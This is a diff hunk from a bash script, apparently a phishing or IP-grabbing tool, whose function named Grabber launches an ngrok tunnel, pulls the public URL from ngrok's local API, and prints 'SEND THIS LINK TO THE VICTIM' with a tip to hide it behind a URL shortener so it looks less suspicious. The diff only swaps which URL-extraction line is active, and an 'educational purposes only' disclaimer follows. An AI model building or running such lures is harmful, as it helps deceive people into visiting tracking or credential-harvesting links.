@@ -227,8 +227,8 @@ function Grabber {
     printf "${GREEN}\n[+]${WHITE}GENERATING URL...\n"
     ngrok http $Port >/dev/null 2>&1 &
     sleep 9
-    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#http#\nhttp#g'|sed 's#.io#.io\n#g'|grep https|head -n 1)
-    #link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+    #link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#http#\nhttp#g'|sed 's#.io#.io\n#g'|grep https|head -n 1)
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
     printf "${GREEN}\n[+]${WHITE}SEND THIS LINK TO THE VICTIM:${YELLOW}$link\n"
     printf "${GREEN}\n[+]${YELLOW}TIPS:${WHITE}USE A URL SHORTENER FOR MASK THESE URL SO IT MAY SEEM LESS SUSPICIOUS:)\n"
     printf "${GREEN}\n[+]${YELLOW}REMINDER:${WHITE}THIS TOOL HAS BEEN DESIGNED FOR EDUCATIONAL AND TEST PURPOSES ONLY PLEASE USE IT WITH GOOD SENSE:)"
